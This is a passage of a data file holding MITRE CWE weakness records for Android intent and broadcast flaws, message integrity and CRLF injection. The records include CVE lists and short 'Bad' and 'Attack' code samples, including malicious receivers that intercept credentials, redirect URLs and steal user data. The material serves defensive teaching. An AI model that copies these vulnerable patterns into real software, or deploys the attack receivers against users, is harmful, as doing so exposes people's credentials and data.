Intent intent) {\n\t\t\tint userID = intent.getIntExtra(\"userID\");\n\t\t\tdestroyUserData(userID);\n\t\t}\n\t}\n```"}, {"BodyText": "This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create an allowlist of trusted applications using the manifest.xml file."}]}], "ObservedExamples": [{"Reference": "CVE-2022-30319", "Description": "S-bus functionality in a home automation product performs access control using an IP allowlist, which can be bypassed by a forged IP address.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-30319"}, {"Reference": "CVE-2022-22547", "Description": "A troubleshooting tool exposes a web server on a random port between 9000-65535 that could be used for information gathering", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-22547"}, {"Reference": "CVE-2022-4390", "Description": "A WAN interface on a router has firewall restrictions enabled for IPv4, but it does not for IPv6, which is enabled by default", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-4390"}, {"Reference": "CVE-2012-2292", "Description": "Product has a Silverlight cross-domain policy that does not restrict access to another application, which allows remote attackers to bypass the Same Origin Policy.", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-2292"}, {"Reference": "CVE-2012-5810", "Description": "Mobile banking application does not verify hostname, leading to financial loss.", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-5810"}, {"Reference": "CVE-2014-1266", "Description": "chain: incorrect \"goto\" in Apple SSL product bypasses certificate validation, allowing Adversry-in-the-Middle (AITM) attack (Apple \"goto fail\" bug). CWE-705 (Incorrect Control Flow Scoping) -> CWE-561 (Dead Code) -> CWE-295 (Improper Certificate Validation) -> CWE-393 (Return of Wrong Status Code) -> CWE-300 (Channel Accessible by Non-Endpoint).", "Link": "https://www.cve.org/CVERecord?id=CVE-2014-1266"}, {"Reference": "CVE-2000-1218", "Description": "DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-1218"}], "RelatedAttackPatterns": ["161", "481", "501", "697"], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}, "Top25Examples": [{"Reference": "CVE-2022-22547", "Description": "Simple Diagnostics Agent - versions 1.0 (up to version 1.57.), allows an attacker to access information which would otherwise be restricted via a random port 9000-65535. This allows information gathering which could be used exploit future open-source security exploits."}, {"Reference": "CVE-2022-2663", "Description": "An issue was found in the Linux kernel in nf_conntrack_irc where the message handling can be confused and incorrectly matches the message. A firewall may be able to be bypassed when users are using unencrypted IRC with nf_conntrack_irc configured."}, {"Reference": "CVE-2022-44784", "Description": "An issue was discovered in Appalti & Contratti 9.12.2. The target web applications LFS and DL229 expose a set of services provided by the Axis 1.4 instance, embedded directly into the applications, as hinted by the WEB-INF/web.xml file leaked through Local File Inclusion. Among the exposed services, there is the Axis AdminService, which, through the default configuration, should normally be accessible only by the localhost. Nevertheless, by trying to access the mentioned service, both in LFS and DL229, the service can actually be reached even by remote users, allowing creation of arbitrary services on the server side. When an attacker can reach the AdminService, they can use it to instantiate arbitrary services on the server. The exploit procedure is well known and described in Generic AXIS-SSRF exploitation. Basically, the attack consists of writing a JSP page inside the root directory of the web application, through the org.apache.axis.handlers.LogHandler class."}, {"Reference": "CVE-2022-26834", "Description": "Improper access control vulnerability in Rakuten Casa version AP_F_V1_4_1 or AP_F_V2_0_0 allows a remote attacker to obtain the information stored in the product because the product is set to accept HTTP connections from the WAN side by default."}, {"Reference": "CVE-2022-4390", "Description": "A network misconfiguration is present in versions prior to 1.0.9.90 of the NETGEAR RAX30 AX2400 series of routers. IPv6 is enabled for the WAN interface by default on these devices. While there are firewall restrictions in place that define access restrictions for IPv4 traffic, these restrictions do not appear to be applied to the WAN interface for IPv6. This allows arbitrary access to any services running on the device that may be inadvertently listening via IPv6, such as the SSH and Telnet servers spawned on ports 22 and 23 by default. This misconfiguration could allow an attacker to interact with services only intended to be accessible by clients on the local network."}, {"Reference": "CVE-2022-45414", "Description": "If a Thunderbird user quoted from an HTML email, for example by replying to the email, and the email contained either a VIDEO tag with the POSTER attribute or an OBJECT tag with a DATA attribute, a network request to the referenced remote URL was performed, regardless of a configuration to block remote content. An image loaded from the POSTER attribute was shown in the composer window. These issues could have given an attacker additional capabilities when targetting releases that did not yet have a fix for CVE-2022-3033 which was reported around three months ago. This vulnerability affects Thunderbird < 102.5.1."}, {"Reference": "CVE-2022-47717", "Description": "Last Yard 22.09.8-1 is vulnerable to Cross-origin resource sharing (CORS)."}, {"Reference": "CVE-2022-3057", "Description": "Inappropriate implementation in iframe Sandbox in Google Chrome prior to 105.0.5195.52 allowed a remote attacker to leak cross-origin data via a crafted HTML page."}, {"Reference": "CVE-2022-31055", "Description": "kCTF is a Kubernetes-based infrastructure for capture the flag (CTF) competitions. Prior to version 1.6.0, the kctf cluster set-src-ip-ranges was broken and allowed traffic from any IP. The problem has been patched in v1.6.0. As a workaround, those who want to test challenges privately can mark them as `public: false` and use `kctf chal debug port-forward` to connect."}]}
{"ID": "924", "Name": "Improper Enforcement of Message Integrity During Transmission in a Communication Channel", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product establishes a communication channel with an endpoint and receives a message from that endpoint, but it does not sufficiently ensure that the message was not modified during transmission.", "ExtendedDescription": "Attackers might be able to modify the message and spoof the endpoint by interfering with the data as it crosses the network or by redirecting the connection to a system under their control.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "345", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "345", "ViewID": "1003", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Integrity", "Confidentiality"], "Impact": ["Gain Privileges or Assume Identity"], "Note": "If an attackers can spoof the endpoint, the attacker gains all the privileges that were intended for the original endpoint."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Maintenance", "Note": "This entry should be made more comprehensive in later CWE versions, as it is likely an important design flaw that underlies (or chains to) other weaknesses."}]}
{"ID": "925", "Name": "Improper Verification of Intent by Broadcast Receiver", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The Android application uses a Broadcast Receiver that receives an Intent but does not properly verify that the Intent came from an authorized source.", "ExtendedDescription": "Certain types of Intents, identified by action string, can only be broadcast by the operating system itself, not by third-party applications. However, when an application registers to receive these implicit system intents, it is also registered to receive any explicit intents. While a malicious application cannot send an implicit system intent, it can send an explicit intent to the target application, which may assume that any received intent is a valid implicit system intent and not an explicit intent from another application. This may lead to unintended behavior.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "940", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Mobile", "Prevalence": "Undetermined"}], "AlternateTerms": [{"Term": "Intent Spoofing"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Gain Privileges or Assume Identity"], "Note": "Another application can impersonate the operating system and cause the software to perform an unintended action."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Before acting on the Intent, check the Intent Action to make sure it matches the expected System action."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following example demonstrates the weakness."}, {"Nature": "Bad", "Language": "XML", "ExampleCode": "```\n\t<manifest package=\"com.example.vulnerableApplication\">\n\t\t\t<application>\n```\n...* \n\t\t\t\n\t\t\t```\n\t\t\t\t\t<receiver android:name=\".ShutdownReceiver\">\n\t\t\t\t\t\t<intent-filter>\n\t\t\t\t\t\t\t<action android:name=\"android.intent.action.ACTION_SHUTDOWN\" />\n\t\t\t\t\t\t</intent-filter>\n\t\t\t\t\t</receiver>\n```\n...* \n\t\t\t\n\t\t\t</application></manifest>"}, {"BodyText": "The ShutdownReceiver class will handle the intent:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n```\n...* \n\tIntentFilter filter = new IntentFilter(Intent.ACTION_SHUTDOWN);\n\tBroadcastReceiver sReceiver = new ShutDownReceiver();\n\tregisterReceiver(sReceiver, filter);\n\t\n\t *...* \n\t\n\tpublic class ShutdownReceiver extends BroadcastReceiver {\n\t```\n\t\t@Override\n\t\tpublic void onReceive(final Context context, final Intent intent) {\n\t\t\tmainActivity.saveLocalData();\n\t\t\tmainActivity.stopActivity();\n\t\t}\n\t}\n```"}, {"BodyText": "Because the method does not confirm that the intent action is the expected system intent, any received intent will trigger the shutdown procedure, as shown here:"}, {"Nature": "Attack", "Language": "Java", "ExampleCode": "```\n\twindow.location = examplescheme://method?parameter=value\n```"}, {"BodyText": "An attacker can use this behavior to cause a denial of service."}]}], "RelatedAttackPatterns": ["499"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Maintenance", "Note": "This entry will be made more comprehensive in later CWE versions."}]}
{"ID": "926", "Name": "Improper Export of Android Application Components", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The Android application exports a component for use by other applications, but does not properly restrict which applications can launch the component or access the data it contains.", "ExtendedDescription": "\n\nThe attacks and consequences of improperly exporting a component may depend on the exported component:\n\n\n  - If access to an exported Activity is not restricted, any application will be able to launch the activity. This may allow a malicious application to gain access to sensitive information, modify the internal state of the application, or trick a user into interacting with the victim application while believing they are still interacting with the malicious application.\n\n  - If access to an exported Service is not restricted, any application may start and bind to the Service. Depending on the exposed functionality, this may allow a malicious application to perform unauthorized actions, gain access to sensitive information, or corrupt the internal state of the application.\n\n  - If access to a Content Provider is not restricted to only the expected applications, then malicious applications might be able to access the sensitive data. Note that in Android before 4.2, the Content Provider is automatically exported unless it has been explicitly declared as NOT exported.\n\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "285", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Mobile", "Prevalence": "Undetermined"}], "BackgroundDetails": ["\n\nThere are three types of components that can be exported in an Android application.\n\n\n  - An Activity is an application component that provides a UI for users to interact with. A typical application will have multiple Activity screens that perform different functions, such as a main Activity screen and a separate settings Activity screen.\n\n  - A Service is an application component that is started by another component to execute an operation in the background, even after the invoking component is terminated. Services do not have a UI component visible to the user.\n\n  - The Content Provider mechanism can be used to share data with other applications or internally within the same application.\n\n"], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}], "CommonConsequences": [{"Scope": ["Availability", "Integrity"], "Impact": ["Unexpected State", "DoS: Crash, Exit, or Restart", "DoS: Instability", "Varies by Context"], "Note": "Other applications, possibly untrusted, can launch the Activity."}, {"Scope": ["Availability", "Integrity"], "Impact": ["Unexpected State", "Gain Privileges or Assume Identity", "DoS: Crash, Exit, or Restart", "DoS: Instability", "Varies by Context"], "Note": "Other applications, possibly untrusted, can bind to the Service."}, {"Scope": ["Confidentiality", "Integrity"], "Impact": ["Read Application Data", "Modify Application Data"], "Note": "Other applications, possibly untrusted, can read or modify the data that is offered by the Content Provider."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Build and Compilation"], "Strategy": "Attack Surface Reduction", "Description": "If they do not need to be shared by other applications, explicitly mark components with android:exported=\"false\" in the application manifest."}, {"Phase": ["Build and Compilation"], "Strategy": "Attack Surface Reduction", "Description": "If you only intend to use exported components between related apps under your control, use android:protectionLevel=\"signature\" in the xml manifest to restrict access to applications signed by you."}, {"Phase": ["Build and Compilation", "Architecture and Design"], "Strategy": "Attack Surface Reduction", "Description": "Limit Content Provider permissions (read/write) as appropriate."}, {"Phase": ["Build and Compilation", "Architecture and Design"], "Strategy": "Separation of Privilege", "Description": "Limit Content Provider permissions (read/write) as appropriate."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "This application is exporting an activity and a service in its manifest.xml:"}, {"Nature": "Bad", "Language": "XML", "ExampleCode": "```\n\t<activity android:name=\"com.example.vulnerableApp.mainScreen\">\n```\n...* \n\t\t\t<intent-filter>\n\t\t\t```\n\t\t\t\t<action android:name=\"com.example.vulnerableApp.OPEN_UI\" />\n\t\t\t\t<category android:name=\"android.intent.category.DEFAULT\" />\n\t\t\t</intent-filter>\n```\n...* \n\t\t\t</activity>\n\t<service android:name=\"com.example.vulnerableApp.backgroundService\">\n\t```\n```\n...* \n\t\t\t<intent-filter>\n\t\t\t```\n\t\t\t\t<action android:name=\"com.example.vulnerableApp.START_BACKGROUND\" />\n\t\t\t</intent-filter>\n```\n...* \n\t\t\t</service>"}, {"BodyText": "Because these components have intent filters but have not explicitly set 'android:exported=false' elsewhere in the manifest, they are automatically exported so that any other application can launch them. This may lead to unintended behavior or exploits."}]}, {"Entries": [{"IntroText": "This application has created a content provider to enable custom search suggestions within the application:"}, {"Nature": "Bad", "Language": "XML", "ExampleCode": "```\n\t<provider>\n\t\tandroid:name=\"com.example.vulnerableApp.searchDB\"\n\t\tandroid:authorities=\"com.example.vulnerableApp.searchDB\">\n\t</provider>\n```"}, {"BodyText": "Because this content provider is only intended to be used within the application, it does not need to be exported. However, in Android before 4.2, it is automatically exported thus potentially allowing malicious applications to access sensitive information."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-25527", "Description": "Improper export of Android application components vulnerability in Samsung Pay (India only) prior to version 4.1.77 allows attacker to access Bill Pay and Recharge menu without authentication."}, {"Reference": "CVE-2022-25817", "Description": "Improper authentication in One UI Home prior to SMR Mar-2022 Release 1 allows attacker to generate pinned-shortcut without user consent."}]}
{"ID": "927", "Name": "Use of Implicit Intent for Sensitive Communication", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The Android application uses an implicit intent for transmitting sensitive data to other applications.", "ExtendedDescription": "\n\nSince an implicit intent does not specify a particular application to receive the data, any application can process the intent by using an Intent Filter for that intent. This can allow untrusted applications to obtain sensitive data. There are two variations on the standard broadcast intent, ordered and sticky.\n\n\nOrdered broadcast intents are delivered to a series of registered receivers in order of priority as declared by the Receivers. A malicious receiver can give itself a high priority and cause a denial of service by stopping the broadcast from propagating further down the chain. There is also the possibility of malicious data modification, as a receiver may also alter the data within the Intent before passing it on to the next receiver. The downstream components have no way of asserting that the data has not been altered earlier in the chain.\n\n\nSticky broadcast intents remain accessible after the initial broadcast. An old sticky intent will be broadcast again to any new receivers that register for it in the future, greatly increasing the chances of information exposure over time. Also, sticky broadcasts cannot be protected by permissions that may apply to other kinds of intents.\n\n\nIn addition, any broadcast intent may include a URI that references data that the receiving component does not normally have the privileges to access. The sender of the intent can include special privileges that grant the receiver read or write access to the specific URI included in the intent. A malicious receiver that intercepts this intent will also gain those privileges and be able to read or write the resource at the specified URI.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "285", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "668", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Mobile", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "Other applications, possibly untrusted, can read the data that is offered through the Intent."}, {"Scope": ["Integrity"], "Impact": ["Varies by Context"], "Note": "The application may handle responses from untrusted applications on the device, which could cause it to perform unexpected or unauthorized actions."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "If the application only requires communication with its own components, then the destination is always known, and an explicit intent could be used."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "This application wants to create a user account in several trusted applications using one broadcast intent:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tIntent intent = new Intent();\n\tintent.setAction(\"com.example.CreateUser\");\n\tintent.putExtra(\"Username\", uname_string);\n\tintent.putExtra(\"Password\", pw_string);\n\tsendBroadcast(intent);\n```"}, {"BodyText": "This application assumes only the trusted applications will be listening for the action. A malicious application can register for this action and intercept the user's login information, as below:"}, {"Nature": "Attack", "Language": "Java", "ExampleCode": "```\n\tIntentFilter filter = new IntentFilter(\"com.example.CreateUser\");\n\tMyReceiver receiver = new MyReceiver();\n\tregisterReceiver(receiver, filter);\n```"}, {"BodyText": "When a broadcast contains sensitive information, create an allowlist of applications that can receive the action using the application's manifest file, or programmatically send the intent to each individual intended receiver."}]}, {"Entries": [{"IntroText": "This application interfaces with a web service that requires a separate user login. It creates a sticky intent, so that future trusted applications that also use the web service will know who the current user is:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tIntent intent = new Intent();\n\tintent.setAction(\"com.example.service.UserExists\");\n\tintent.putExtra(\"Username\", uname_string);\n\tsendStickyBroadcast(intent);\n```"}, {"Nature": "Attack", "Language": "Java", "ExampleCode": "```\n\tIntentFilter filter = new IntentFilter(\"com.example.service.UserExists\");\n\tMyReceiver receiver = new MyReceiver();\n\tregisterReceiver(receiver, filter);\n```"}, {"BodyText": "Sticky broadcasts can be read by any application at any time, and so should never contain sensitive information such as a username."}]}, {"Entries": [{"IntroText": "This application is sending an ordered broadcast, asking other applications to open a URL:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tIntent intent = new Intent();\n\tintent.setAction(\"com.example.OpenURL\");\n\tintent.putExtra(\"URL_TO_OPEN\", url_string);\n\tsendOrderedBroadcastAsUser(intent);\n```"}, {"BodyText": "Any application in the broadcast chain may alter the data within the intent. This malicious application is altering the URL to point to an attack site:"}, {"Nature": "Attack", "Language": "Java", "ExampleCode": "```\n\tpublic class CallReceiver extends BroadcastReceiver {\n\t\t@Override\n\t\tpublic void onReceive(Context context, Intent intent) {\n\t\t\tString Url = intent.getStringExtra(Intent.URL_TO_OPEN);\n\t\t\tattackURL = \"www.example.com/attack?\" + Url;\n\t\t\tsetResultData(attackURL);\n\t\t}\n\t}\n```"}, {"BodyText": "The final receiving application will then open the attack URL. Where possible, send intents to specific trusted applications instead of using a broadcast chain."}]}, {"ID": "DX-108", "Entries": [{"IntroText": "This application sends a special intent with a flag that allows the receiving application to read a data file for backup purposes."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tIntent intent = new Intent();\n\tintent.setAction(\"com.example.BackupUserData\");\n\tintent.setData(file_uri);\n\tintent.addFlags(FLAG_GRANT_READ_URI_PERMISSION);\n\tsendBroadcast(intent);\n```"}, {"Nature": "Attack", "Language": "Java", "ExampleCode": "```\n\tpublic class CallReceiver extends BroadcastReceiver {\n\t\t@Override\n\t\tpublic void onReceive(Context context, Intent intent) {\n\t\t\tUri userData = intent.getData();\n\t\t\tstealUserData(userData);\n\t\t}\n\t}\n```"}, {"BodyText": "Any malicious application can register to receive this intent. Because of the FLAG_GRANT_READ_URI_PERMISSION included with the intent, the malicious receiver code can read the user's data."}]}], "ObservedExamples": [{"Reference": "CVE-2022-4903", "Description": "An Android application does not use FLAG_IMMUTABLE when creating a PendingIntent.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-4903"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-39869", "Description": "Improper access control vulnerability in cloudNotificationManager.java SmartThings prior to version 1.7.89.0 allows attackers to access sensitive information via REMOVE_PERSISTENT_BANNER broadcast."}, {"Reference": "CVE-2022-39870", "Description": "Improper access control vulnerability in cloudNotificationManager.java SmartThings prior to version 1.7.89.0 allows attackers to access sensitive information via PUSH_MESSAGE_RECEIVED broadcast."}, {"Reference": "CVE-2022-39871", "Description": "Improper access control vulnerability cloudNotificationManager.java in SmartThings prior to version 1.7.89.0 allows attackers to access sensitive information via implicit broadcasts."}, {"Reference": "CVE-2022-39878", "Description": "Improper access control vulnerability in Samsung Checkout prior to version 5.0.55.3 allows attackers to access sensitive information via implicit intent broadcast."}, {"Reference": "CVE-2022-39894", "Description": "Improper access control vulnerability in ContactListStartActivityHelper in Phone prior to SMR Dec-2022 Release 1 allows to access sensitive information via implicit intent."}, {"Reference": "CVE-2022-39895", "Description": "Improper access control vulnerability in ContactListUtils in Phone prior to SMR Dec-2022 Release 1 allows to access contact group information via implicit intent."}, {"Reference": "CVE-2022-39896", "Description": "Improper access control vulnerabilities in Contacts prior to SMR Dec-2022 Release 1 allows to access sensitive information via implicit intent."}, {"Reference": "CVE-2022-39915", "Description": "Improper access control vulnerability in Calendar prior to versions 11.6.08.0 in Android Q(10), 12.2.11.3000 in Android R(11), 12.3.07.2000 in Android S(12), and 12.4.02.0 in Android T(13) allows attackers to access sensitive information via implicit intent."}, {"Reference": "CVE-2022-4903", "Description": "A vulnerability was found in CodenameOne 7.0.70. It has been classified as problematic. Affected is an unknown function. The manipulation leads to use of implicit intent for sensitive communication. It is possible to launch the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. Upgrading to version 7.0.71 is able to address this issue. The patch is identified as dad49c9ef26a598619fc48d2697151a02987d478. It is recommended to upgrade the affected component. VDB-220470 is the identifier assigned to this vulnerability."}, {"Reference": "CVE-2022-36829", "Description": "PendingIntent hijacking vulnerability in releaseAlarm in Charm by Samsung prior to version 1.2.3 allows local attackers to access files without permission via implicit intent."}, {"Reference": "CVE-2022-36830", "Description": "PendingIntent hijacking vulnerability in cancelAlarmManager in Charm by Samsung prior to version 1.2.3 allows local attackers to access files without permission via implicit intent."}, {"Reference": "CVE-2022-33733", "Description": "Sensitive information exposure in onCharacteristicRead in Charm by Samsung prior to version 1.2.3 allows attacker to get bluetooth connection information without permission."}, {"Reference": "CVE-2022-33734", "Description": "Sensitive information exposure in onCharacteristicChanged in Charm by Samsung prior to version 1.2.3 allows attacker to get bluetooth connection information without permission."}]}
{"ID": "93", "Name": "Improper Neutralization of CRLF Sequences ('CRLF Injection')", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product uses CRLF (carriage return line feeds) as a special element, e.g. to separate lines or records, but it does not neutralize or incorrectly neutralizes CRLF sequences from inputs.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "74", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "117", "ViewID": "1000"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Modify Application Data"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Avoid using CRLF as a special sequence."}, {"Phase": ["Implementation"], "Description": "Appropriately filter or quote CRLF sequences in user-controlled input."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "If user input data that eventually makes it to a log message isn't checked for CRLF characters, it may be possible for an attacker to forge entries in a log file."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tlogger.info(\"User's street address: \" + request.getParameter(\"streetAddress\"));\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2002-1771", "Description": "CRLF injection enables spam proxy (add mail headers) using email address or name.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1771"}, {"Reference": "CVE-2002-1783", "Description": "CRLF injection in API function arguments modify headers for outgoing requests.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1783"}, {"Reference": "CVE-2004-1513", "Description": "Spoofed entries in web server log file via carriage returns", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-1513"}, {"Reference": "CVE-2006-4624", "Description": "Chain: inject fake log entries with fake timestamps using CRLF injection", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4624"}, {"Reference": "CVE-2005-1951", "Description": "Chain: Application accepts CRLF in an object ID, allowing HTTP response splitting.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1951"}, {"Reference": "CVE-2004-1687", "Description": "Chain: HTTP response splitting via CRLF in parameter related to URL.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-1687"}], "RelatedAttackPatterns": ["15", "81"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-31249", "Description": "A CRLF injection vulnerability was found on BF-430, BF-431, and BF-450M TCP/IP Converter devices from CHIYU Technology Inc due to a lack of validation on the parameter redirect= available on multiple CGI components."}, {"Reference": "CVE-2022-31014", "Description": "Nextcloud server is an open source personal cloud server. Affected versions were found to be vulnerable to SMTP command injection. The impact varies based on which commands are supported by the backend SMTP server. However, the main risk here is that the attacker can then hijack an already-authenticated SMTP session and run arbitrary SMTP commands as the email user, such as sending emails to other users, changing the FROM user, and so on. As before, this depends on the configuration of the server itself, but newlines should be sanitized to mitigate such arbitrary SMTP command injection. It is recommended that the Nextcloud Server is upgraded to 22.2.8 , 23.0.5 or 24.0.1. There are no known workarounds for this issue."}, {"Reference": "CVE-2022-31179", "Description": "Shescape is a simple shell escape package for JavaScript. Versions prior to 1.5.8 were found to be subject to code injection on windows. This impacts users that use Shescape (any API function) to escape arguments for cmd.exe on Windows An attacker can omit all arguments following their input by including a line feed character (`'\\\\n'`) in the payload. This bug has been patched in [v1.5.8] which you can upgrade to now. No further changes are required. Alternatively, line feed characters (`'\\\\n'`) can be stripped out manually or the user input can be made the last argument (this only limits the impact)."}, {"Reference": "CVE-2022-27924", "Description": "Zimbra Collaboration (aka ZCS) 8.8.15 and 9.0 allows an unauthenticated attacker to inject arbitrary memcache commands into a targeted instance. These memcache commands becomes unescaped, causing an overwrite of arbitrary cached entries."}, {"Reference": "CVE-2022-29631", "Description": "Jodd HTTP v6.0.9 was discovered to contain multiple CLRF injection vulnerabilities via the components jodd.http.HttpRequest#set and `jodd.http.HttpRequest#send. These vulnerabilities allow attackers to execute Server-Side Request Forgery (SSRF) via a crafted TCP payload."}, {"Reference": "CVE-2022-26635", "Description": "PHP-Memcached v2.2.0 and below contains an improper NULL termination which allows attackers to execute CLRF injection. Note: Third parties have disputed this as not affecting PHP-Memcached directly."}, {"Reference": "CVE-2021-42010", "Description": "Heron versions <= 0.20.4-incubating allows CRLF log injection because of the lack of escaping in the log statements. Please update to version 0.20.5-incubating which addresses this issue."}, {"Reference": "CVE-2022-0391", "Description": "A flaw was found in Python, specifically within the urllib.parse module. This module helps break Uniform Resource Locator (URL) strings into components. The issue involves how the urlparse method does not sanitize input and allows characters like '\\\\r' and '\\\\n' in 